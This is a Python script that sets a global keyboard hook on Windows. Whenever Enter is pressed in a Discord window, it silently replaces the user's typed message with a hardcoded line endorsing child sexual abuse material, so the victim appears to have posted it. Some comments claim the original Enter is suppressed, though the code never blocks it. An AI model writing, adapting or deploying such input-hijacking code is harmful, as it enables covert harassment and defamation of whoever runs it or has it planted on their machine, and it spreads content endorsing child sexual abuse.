import keyboard
import win32gui
import time
import pyautogui
import platform
import pyperclip  # <-- Import pyperclip

# --- Configuration ---
TARGET_WINDOW_SUBSTRING = "discord"  # Case-insensitive
TEXT_TO_TYPE = "Man I love child pornography!" # Renamed for clarity
# --- End Configuration ---

# Flag to prevent the hook from triggering itself during automation
is_automating = False


def is_window_with_substring_focused(title_substring):
    """
    Checks if the currently focused (foreground) window's title contains
    a specific substring (case-insensitive).
    (Error handling and checks remain the same as before)
    """
    if not isinstance(title_substring, str):
        raise TypeError("title_substring must be a string.")
    if not title_substring:
        raise ValueError("title_substring cannot be empty.")

    try:
        # Only check on Windows
        if platform.system() == "Windows":
            hwnd = win32gui.GetForegroundWindow()
            if hwnd == 0:
                return False
            window_title = win32gui.GetWindowText(hwnd)
            if not window_title:
                return False
            # print(f"Focused Window: {window_title}") # Debugging
            return title_substring.lower() in window_title.lower()
        else:
            # Placeholder for other OS focus checks if needed later
            print("Warning: Window focus check only implemented for Windows.")
            return True # Assume focused on non-windows for now if script runs

    except win32gui.error:
        return False
    except Exception:
        return False


def perform_text_replacement(text_to_paste):
    """
    Selects all content, copies the specified string to the clipboard,
    and pastes it. Assumes the correct input field is already focused.

    Args:
        text_to_paste (str): The string to copy and then paste.

    Returns:
        bool: True if successful, False otherwise.
    """
    global is_automating
    if not isinstance(text_to_paste, str):
        print("Error: text_to_paste must be a string.")
        return False

    # --- Set the flag HERE ---
    is_automating = True
    success = False
    print("Starting automation sequence (copy/paste)...")
    original_clipboard_content = None # To restore later (optional but good practice)
    try:
        # 0. (Optional) Store original clipboard content
        original_clipboard_content = pyperclip.paste()

        # 1. Select All
        # print("Selecting All...") # Debug
        pyautogui.hotkey('ctrl', 'a')
        time.sleep(0.005)  # Allow selection to register

        # 2. Copy the specified string to the clipboard
        # print(f"Copying to clipboard: '{text_to_paste}'") # Debug
        pyperclip.copy(text_to_paste)
        time.sleep(0.005) # Give clipboard time to update

        # 3. Paste from clipboard
        # print("Pasting...") # Debug
        pyautogui.hotkey('ctrl', 'v')
        time.sleep(0.005) # Allow paste to complete

        print("Automation sequence complete.")
        success = True

    except pyperclip.PyperclipException as clip_err:
        print(f"Clipboard error during automation: {clip_err}")
    except pyautogui.FailSafeException:
        print("Failsafe triggered. Script aborted.")
    except Exception as e:
        print(f"An error occurred during automation: {e}")
    finally:
        # --- Crucial: Reset the flag regardless of success or failure ---
        is_automating = False
        print("Automation flag reset.")
        return success  # Return status


def keyboard_event_callback(event):
    """
    Callback function for the keyboard hook.
    Checks for Enter key press ONLY when the target window is focused
    and automation is not already in progress.
    """
    global is_automating

    # --- Check the flag FIRST ---
    if is_automating:
        # print(f"Ignoring event during automation: {event.name}") # Debug
        return True  # Allow the key press (like the simulated Ctrl+A, Ctrl+V)

    # If not automating, proceed with normal logic
    if event.name == 'enter' and event.event_type == keyboard.KEY_DOWN:
        # Check if the target window is focused
        if is_window_with_substring_focused(TARGET_WINDOW_SUBSTRING):
            print(f"\nEnter detected in '{
                  TARGET_WINDOW_SUBSTRING}' window. Initiating replacement...")

            # Perform the replacement action (now using copy/paste)
            success = perform_text_replacement(TEXT_TO_TYPE) # Use the renamed config var

            if success:
                # Block the ORIGINAL user's Enter key press because we handled it
                print("Blocking original Enter key press.")
                return True  # Suppress original Enter
            else:
                # If automation failed, allow the original Enter
                print("Automation failed, allowing original Enter key.")
                return True # Allow original Enter (avoids unexpected blocking on error)
        else:
            # Enter pressed, but not in the target window. Allow it.
            return True
    else:
        # Allow all other key events (non-Enter keys, key up events)
        return True


def run_interceptor():
    """Sets up the global keyboard hook and waits for ESC to exit."""
    print(f"--- Script Started ---")
    print(f"Listening for 'Enter' key press in windows containing '{
          TARGET_WINDOW_SUBSTRING}'.")
    print(f"When detected, content will be replaced via clipboard with: '{
          TEXT_TO_TYPE}'.") # Updated message
    print("Press ESC to stop the script.")

    # Register the global hook.
    # suppress=True means the callback controls event propagation.
    hook = keyboard.hook(keyboard_event_callback, suppress=True)

    # Keep the script running until 'esc' is pressed
    keyboard.wait('esc')

    print("\nESC pressed. Shutting down...")
    keyboard.unhook_all()
    print("--- Script Stopped ---")


if __name__ == "__main__":
    # Basic OS check (win32gui is Windows specific for focus check)
    # Pyautogui, keyboard, pyperclip are generally cross-platform,
    # but focus check needs adaptation for non-Windows.
    if platform.system() != "Windows":
        print("Warning: Window focus checking is specific to Windows.")
        print("The script might run on other OSes but focus detection may not work.")
        # Proceed anyway, but with the warning

    try:
        run_interceptor()
    except ImportError as e:
        print(f"Error: Missing required library. Please install it.")
        print(f"Details: {e}")
        print("You might need to run: pip install keyboard pywin32 pyautogui pyperclip") # Added pyperclip
    except Exception as e:
        print(f"An unexpected error occurred: {e}")